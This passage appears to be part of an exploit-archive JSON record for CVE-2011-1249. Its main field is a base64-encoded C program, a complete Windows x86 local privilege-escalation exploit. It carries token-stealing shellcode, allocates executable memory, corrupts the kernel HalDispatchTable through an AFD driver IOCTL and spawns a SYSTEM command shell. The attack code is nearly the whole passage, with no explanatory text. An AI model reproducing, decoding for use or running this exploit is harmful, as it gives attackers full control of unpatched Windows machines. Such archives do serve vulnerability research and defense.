QURBVEEgd3NhRGF0YTsNCiAgICBpbnQgd3NhU3RhcnR1cEVycm9yQ29kZTsNCg0KICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNjMyNjYzKHY9dnMuODUpLmFzcHgNCiAgICB3VmVyc2lvblJlcXVlc3RlZCA9IE1BS0VXT1JEKDIsIDIpOw0KDQogICAgLy8gaW5pdGlhdGUgdGhlIHVzZSBvZiB0aGUgV2luc29jayBETEwNCiAgICAvLyAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNzQyMjEzKHY9dnMuODUpLmFzcHgNCiAgICB3c2FTdGFydHVwRXJyb3JDb2RlID0gV1NBU3RhcnR1cCh3VmVyc2lvblJlcXVlc3RlZCwgJndzYURhdGEpOw0KDQogICAgaWYod3NhU3RhcnR1cEVycm9yQ29kZSAhPSAwKQ0KICAgIHsNCiAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODEzODEodj12cy44NSkuYXNweA0KICAgICAgICBwcmludGYoIiAgICAgIFstXSBGYWlsZWQgKGVycm9yIGNvZGU6ICVkKVxuIiwgd3NhU3RhcnR1cEVycm9yQ29kZSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgICAgIFsrXSBEb25lXG4iKTsNCg0KDQogICAgLy8gY3JlYXRlIHNvY2tldA0KICAgIHByaW50ZigiICAgICAgWypdIENyZWF0aW5nIHNvY2tldFxuIik7DQogICAgU09DS0VUIHRhcmdldERldmljZVNvY2tldCA9IElOVkFMSURfU09DS0VUOw0KDQogICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3NDIyMTIodj12cy44NSkuYXNweA0KICAgIHRhcmdldERldmljZVNvY2tldCA9IFdTQVNvY2tldEEoQUZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQLCBOVUxMLCAwLCAwKTsNCg0KICAgIGlmKHRhcmdldERldmljZVNvY2tldCA9PSBJTlZBTElEX1NPQ0tFVCkNCiAgICB7DQogICAgICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNjgxMzgxKHY9dnMuODUpLmFzcHgNCiAgICAgICAgcHJpbnRmKCIgICAgICAgICBbLV0gRmFpbGVkIChlcnJvciBjb2RlOiAlbGQpXG4iLCBXU0FHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgICAgICAgIFsrXSBEb25lXG4iKTsNCg0KDQogICAgLy8gY29ubmVjdCB0byBhIGNsb3NlZCBwb3J0DQogICAgLy8gY29ubmVjdCB0byBwb3J0IDAgb24gdGhlIGxvY2FsIG1hY2hpbmUNCiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gY2xpZW50U2VydmljZTsNCiAgICBjbGllbnRTZXJ2aWNlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIGNsaWVudFNlcnZpY2Uuc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCIxMjcuMC4wLjEiKTsNCiAgICBjbGllbnRTZXJ2aWNlLnNpbl9wb3J0ID0gaHRvbnMoMCk7DQoNCiAgICBwcmludGYoIiAgICAgICAgIFsqXSBDb25uZWN0aW5nIHRvIGNsb3NlZCBwb3J0XG4iKTsNCiAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczczNzYyNSh2PXZzLjg1KS5hc3B4DQogICAgaW50IGNvbm5lY3RSZXN1bHQ7DQogICAgY29ubmVjdFJlc3VsdCA9IGNvbm5lY3QodGFyZ2V0RGV2aWNlU29ja2V0LCAoU09DS0FERFIgKikgJmNsaWVudFNlcnZpY2UsIHNpemVvZihjbGllbnRTZXJ2aWNlKSk7DQogICAgaWYgKGNvbm5lY3RSZXN1bHQgPT0gMCkNCiAgICB7DQogICAgICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNjgxMzgxKHY9dnMuODUpLmFzcHgNCiAgICAgICAgcHJpbnRmICgiICAgICAgICAgICAgWy1dIENvbm5lY3RlZCAoZXJyb3IgY29kZTogJWxkKVxuIiwgV1NBR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcHJpbnRmKCIgICAgICAgICAgICBbK10gRG9uZVxuIik7DQoNCg0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCiAgICAvLyBDUkVBVEUgVE9LRU4gU1RFQUxJTkcgU0hFTExDT0RFDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQogICAgcHJpbnRmKCJbKl0gQ3JlYXRpbmcgdG9rZW4gc3RlYWxpbmcgc2hlbGxjb2RlXG4iKTsNCg0KDQogICAgLy8gY29uc3RydWN0IHRoZSB0b2tlbiBzdGVhbGluZyBzaGVsbGNvZGUNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZVtdID0NCiAgICB7DQogICAgICAgIDB4NTIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBQVVNIIEVEWCAgICAgICAgICAgICAgICAgICAgIFNhdmUgRURYIG9uIHRoZSBzdGFjayAoc2F2ZSBjb250ZXh0KQ0KICAgICAgICAweDUzLAkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFBVU0ggRUJYICAgICAgICAgICAgICAgICAgICAgU2F2ZSBFQlggb24gdGhlIHN0YWNrIChzYXZlIGNvbnRleHQpDQogICAgICAgIDB4MzMsMHhDMCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBYT1IgRUFYLCBFQVggICAgICAgICAgICAgICAgIFplcm8gb3V0IEVBWCAoRUFYID0gMCkNCiAgICAgICAgMHg2NCwweDhCLDB4ODAsMHgyNCwweDAxLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFQVgsIEZTOltFQVgrMHgxMjRdICAgICAgUmV0cmlldmUgY3VycmVudCBfS1RIUkVBRCBzdHJ1Y3R1cmUNCiAgICAgICAgMHg4QiwweDQwLHNoZWxsY29kZV9LUFJPQ0VTUywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFQVgsIFtFQVgrX0tQUk9DRVNTXSAgICAgUmV0cmlldmUgX0VQUk9DRVNTIHN0cnVjdHVyZQ0KICAgICAgICAweDhCLDB4QzgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gTU9WIEVDWCwgRUFYICAgICAgICAgICAgICAgICBDb3B5IEVBWCAoX0VQUk9DRVNTKSB0byBFQ1gNCiAgICAgICAgMHg4QiwweDk4LHNoZWxsY29kZV9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFQlgsIFtFQVgrX1RPS0VOXSAgICAgICAgUmV0cmlldmUgY3VycmVudCBfVE9LRU4NCiAgICAgICAgMHg4QiwweDgwLHNoZWxsY29kZV9BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgIC8vIE1PViBFQVgsIFtFQVgrX0FQTElOS1NdIDwtfCAgUmV0cmlldmUgRkxJTksgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgICAgICAgMHg4MSwweEU4LHNoZWxsY29kZV9BUExJTktTLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgIC8vIFNVQiBFQVgsIF9BUExJTktTICAgICAgICAgfCAgUmV0cmlldmUgRVBST0NFU1MgZnJvbSBBY3RpdmVQcm9jZXNzTGlua3MNCiAgICAgICAgMHg4MSwweEI4LHNoZWxsY29kZV9VUElELDB4MDAsMHgwMCwweDAwLDB4MDQsMHgwMCwweDAwLDB4MDAsIC8vIENNUCBbRUFYK19VUElEXSwgMHg0ICAgICAgfCAgQ29tcGFyZSBVbmlxdWVQcm9jZXNzSWQgd2l0aCA0IChTeXN0ZW0gUHJvY2VzcykNCiAgICAgICAgMHg3NSwweEU4LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIEpOWi9KTkUgICAgICAgICAgICAgICAgLS0tLSAgSnVtcCBpZiBub3QgemVyby9ub3QgZXF1YWwNCiAgICAgICAgMHg4QiwweDkwLHNoZWxsY29kZV9UT0tFTiwweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFRFgsIFtFQVgrX1RPS0VOXSAgICAgICAgQ29weSBTWVNURU0gX1RPS0VOIHRvIEVEWA0KICAgICAgICAweDhCLDB4QzEsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gTU9WIEVBWCwgRUNYICAgICAgICAgICAgICAgICBDb3B5IEVDWCAoY3VycmVudCBwcm9jZXNzIF9UT0tFTikgdG8gRUFYDQogICAgICAgIDB4ODksMHg5MCxzaGVsbGNvZGVfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBNT1YgW0VBWCtfVE9LRU5dLCBFRFggICAgICAgIENvcHkgU1lTVEVNIF9UT0tFTiB0byBjdXJyZW50IHByb2Nlc3MgX1RPS0VODQogICAgICAgIDB4NUIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBQT1AgRUJYICAgICAgICAgICAgICAgICAgICAgIFBvcCBjdXJyZW50IHN0YWNrIHZhbHVlIHRvIEVCWCAocmVzdG9yZSBjb250ZXh0KQ0KICAgICAgICAweDVBLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gUE9QIEVEWCAgICAgICAgICAgICAgICAgICAgICBQb3AgY3VycmVudCBzdGFjayB2YWx1ZSB0byBFRFggKHJlc3RvcmUgY29udGV4dCkNCiAgICAgICAgMHhDMiwweDA4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFJFVCA4ICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuDQogICAgfTsNCg0KICAgIHByaW50ZigiICAgWypdIFNoZWxsY29kZSBhc3NlbWJsZWRcbiIpOw0KDQoNCiAgICAvLyBhbGxvY2F0ZSBtZW1vcnkgKFJXRSBwZXJtaXNzaW9ucykgZm9yIHRoZSBzaGVsbGNvZGUNCiAgICBwcmludGYoIiAgIFsqXSBBbGxvY2F0aW5nIG1lbW9yeVxuIik7DQogICAgTFBWT0lEIHNoZWxsY29kZUFkZHJlc3M7DQogICAgc2hlbGxjb2RlQWRkcmVzcyA9IFZpcnR1YWxBbGxvYygoUFZPSUQpIDB4MDIwNzAwMDAsIDB4MjAwMDAsIE1FTV9SRVNFUlZFIHwgTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQogICAgaW50IGVycm9yQ29kZSA9IDA7DQoNCiAgICBpZihzaGVsbGNvZGVBZGRyZXNzID09IE5VTEwpDQogICAgew0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4MTM4MSh2PXZzLjg1KS5hc3B4DQogICAgICAgIGVycm9yQ29kZSA9IEdldExhc3RFcnJvcigpOw0KICAgICAgICAvLyBpbiBjYXNlIG9mIEVSUk9SX0lOVkFMSURfQUREUkVTUw0KICAgICAgICBpZihlcnJvckNvZGUgPT0gNDg3KQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBBdHRlbXB0IHRvIGFjY2VzcyBpbnZhbGlkIGFkZHJlc3MNCiAgICAgICAgICAgIC8vIG9jY3VycyBzaW5jZSBhIGZpeGVkIGFkZHJlc3MgaXMgYmVpbmcgcmVzZXJ2ZWQNCiAgICAgICAgICAgIC8vICAgaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yMTM2ODQyOS9lcnJvci1jb2RlLTQ4Ny1lcnJvci1pbnZhbGlkLWFkZHJlc3Mtd2hlbi11c2luZy12aXJ0dWFsYWxsb2NleA0KICAgICAgICAgICAgcHJpbnRmKCIgICAgICBbIV0gQ291bGQgbm90IHJlc2VydmUgZW50aXJlIHJhbmdlXG4iKTsNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFJlcnVuIGV4cGxvaXRcbiIpOw0KICAgICAgICB9DQogICAgICAgIC8vIGluIGNhc2Ugb2YgYW55IG90aGVyIGVycm9yDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWy1dIEZhaWxlZCAoZXJyb3IgY29kZTogJWQpXG4iLCBlcnJvckNvZGUpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcHJpbnRmKCIgICAgICBbK10gQWRkcmVzczogICAgICAlIzAxMHhcbiIsIHNoZWxsY29kZUFkZHJlc3MpOw0KDQoNCiAgICAvLyBjb3B5IHRoZSBzaGVsbGNvZGUgdG8gdGhlIGFsbG9jYXRlZCBtZW1vcnkNCiAgICBtZW1zZXQoc2hlbGxjb2RlQWRkcmVzcywgMHg5MCwgMHgyMDAwMCk7DQogICAgbWVtY3B5KChzaGVsbGNvZGVBZGRyZXNzICsgMHgxMDAwMCksIHNoZWxsY29kZSwgc2l6ZW9mKHNoZWxsY29kZSkpOw0KICAgIHByaW50ZigiICAgICAgWypdIFNoZWxsY29kZSBjb3BpZWRcbiIpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gRVhQTE9JVCBUSEUgVlVMTkVSQUJJTElUWQ0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIEV4cGxvaXRpbmcgdnVsbmVyYWJpbGl0eVxuIik7DQoNCg0KICAgIC8vIHNlbmQgQUZEIHNvY2tldCBjb25uZWN0IHJlcXVlc3QNCiAgICBwcmludGYoIiAgIFsqXSBTZW5kaW5nIEFGRCBzb2NrZXQgY29ubmVjdCByZXF1ZXN0XG4iKTsNCiAgICBEV09SRCBscEluQnVmZmVyW2xwSW5CdWZmZXJTaXplXTsNCiAgICBtZW1zZXQobHBJbkJ1ZmZlciwgMCwgKGxwSW5CdWZmZXJTaXplICogc2l6ZW9mKERXT1JEKSkpOw0KDQogICAgbHBJbkJ1ZmZlclszXSA9IDB4MDE7DQogICAgbHBJbkJ1ZmZlcls0XSA9IDB4MjA7DQogICAgVUxPTkcgbHBCeXRlc1JldHVybmVkID0gMDsNCg0KICAgIGlmKERldmljZUlvQ29udHJvbCgNCiAgICAgICAgKEhBTkRMRSkgdGFyZ2V0RGV2aWNlU29ja2V0LA0KICAgICAgICAweDAwMDEyMDA3LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gSU9DVExfQUZEX0NPTk5FQ1QNCiAgICAgICAgKFBWT0lEKSBscEluQnVmZmVyLCBzaXplb2YobHBJbkJ1ZmZlciksDQogICAgICAgIChQVk9JRCkgKEhhbERpc3BhdGNoVGFibGVLcm5sU3BjQWRkciArIDB4NiksIDB4MCwNCiAgICAgICAgJmxwQnl0ZXNSZXR1cm5lZCwgTlVMTA0KICAgICAgICApID09IDApDQogICAgew0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY3OTM2MCh2PXZzLjg1KS5hc3B4DQogICAgICAgIGVycm9yQ29kZSA9IEdldExhc3RFcnJvcigpOw0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4MTM4MSh2PXZzLjg1KS5hc3B4DQogICAgICAgIC8vIGluIGNhc2Ugb2YgRVJST1JfSU5WQUxJRF9ORVROQU1FDQogICAgICAgIGlmKGVycm9yQ29kZSA9PSAxMjE0KQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBBRkQgc29ja2V0IGNvbm5lY3QgcmVxdWVzdCBzdWNjZXNzZnVsDQogICAgICAgICAgICBwcmludGYoIiAgICAgIFsrXSBEb25lXG4iKTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBpbiBjYXNlIG9mIEVSUk9SX05PQUNDRVNTDQogICAgICAgIGVsc2UgaWYoZXJyb3JDb2RlID09IDk5OCkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gQUZEIHNvY2tldCBjb25uZWN0IHJlcXVlc3QgdW5zdWNjZXNzZnVsIC0gdGFyZ2V0IGlzIHBhdGNoZWQNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWyFdIFRhcmdldCBwYXRjaGVkXG4iKTsNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFBvc3NpYmxlIHNlY3VyaXR5IHBhdGNoZXNcbiIpOw0KICAgICAgICAgICAgZm9yKGkgPSAwOyBpIDwgc2VjdXJpdHlQYXRjaGVzQ291bnQ7IGkrKykNCiAgICAgICAgICAgICAgICBwcmludGYoIiAgICAgICAgICAgIFsqXSAlc1xuIiwgc2VjdXJpdHlQYXRjaGVzUHRyW2ldKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBpbiBjYXNlIG9mIGFueSBvdGhlciBlcnJvciBtZXNzYWdlDQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gcHJpbnQgdGhlIGVycm9yIGNvZGUNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWy1dIEZhaWxlZCAoZXJyb3IgY29kZTogJWQpXG4iLCBlcnJvckNvZGUpOw0KICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQogICAgfQ0KDQoNCiAgICAvLyBlbGV2YXRlIHByaXZpbGVnZXMgb2YgdGhlIGN1cnJlbnQgcHJvY2Vzcw0KICAgIHByaW50ZigiICAgICAgWypdIEVsZXZhdGluZyBwcml2aWxlZ2VzIHRvIFNZU1RFTVxuIik7DQogICAgVUxPTkcgb3V0SW50ZXJ2YWwgPSAwOw0KICAgIC8vIGh0dHBzOi8vdW5kb2N1bWVudGVkLm50aW50ZXJuYWxzLm5ldC9pbmRleC5odG1sP3BhZ2U9VXNlck1vZGUlMkZVbmRvY3VtZW50ZWQlMjBGdW5jdGlvbnMlMkZOVCUyME9iamVjdHMlMkZQcm9maWxlJTJGTnRRdWVyeUludGVydmFsUHJvZmlsZS5odG1sDQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSgyLCAmb3V0SW50ZXJ2YWwpOw0KICAgIHByaW50ZigiICAgICAgICAgWytdIERvbmVcbiIpOw0KDQoNCiAgICAvLyBzcGF3biBzaGVsbCAod2l0aCBlbGV2YXRlZCBwcml2aWxlZ2VzKQ0KICAgIHByaW50ZigiICAgICAgICAgWypdIFNwYXduaW5nIHNoZWxsXG4iKTsNCiAgICAvLyBzcGF3biBTWVNURU0gc2hlbGwgd2l0aGluIHRoZSBjdXJyZW50IHNoZWxsIChyZW1vdGUgc2hlbGwgZnJpZW5kbHkpDQogICAgc3lzdGVtICgiYzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlIC9LIGNkIGM6XFx3aW5kb3dzXFxzeXN0ZW0zMiIpOw0KDQogICAgLy8gY2xlYW4gdXAgYW5kIGV4aXQNCiAgICBwcmludGYoIlxuWypdIEV4aXRpbmcgU1lTVEVNIHNoZWxsXG4iKTsNCiAgICBXU0FDbGVhbnVwKCk7DQogICAgcmV0dXJuIDE7DQp9DQoNCi8vIEVvRg==", 
    "filename": "platforms/win_x86/local/40564.c", 
    "id": "40564", 
    "cves": [
        "CVE-2011-1249"
    ]
}